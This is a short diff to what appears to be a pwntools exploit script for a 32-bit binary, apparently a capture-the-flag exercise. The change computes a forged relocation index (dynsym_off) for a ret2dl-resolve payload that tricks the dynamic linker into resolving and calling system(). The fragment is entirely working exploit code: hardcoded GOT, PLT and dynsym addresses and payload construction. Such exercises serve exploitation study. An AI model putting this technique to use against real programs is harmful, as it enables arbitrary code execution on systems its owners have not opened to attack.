@@ -14,6 +14,7 @@ read_got = 0x804a010
 
 pppop_ret = 0x8048619
 
+dynsym_addr = 0x80481d8
 dynstr_addr = 0x8048278
 rel_plt_addr = 0x8048330
 dynamic_addr = 0x8048f14
@@ -22,6 +23,7 @@ dynamic_addr = 0x8048f14
 
 base_addr = bss_addr+0x20
 reloc_arg = base_addr-rel_plt_addr
+dynsym_off = ((base_addr+0x8-dynsym_addr)/0x10) << 0x8| 0x7
 system_off = base_addr+0x18-dynstr_addr
 
 p = process(elf)
@@ -43,7 +45,7 @@ payload += p8(0)*(0x100-len(payload))
 p.send(payload)
 
 payload = p32(read_got)
-payload += p32(0x1e907)
+payload += p32(dynsym_off)
 payload += p32(system_off)
 payload += p32(0)*0x2
 payload += p32(0x12)
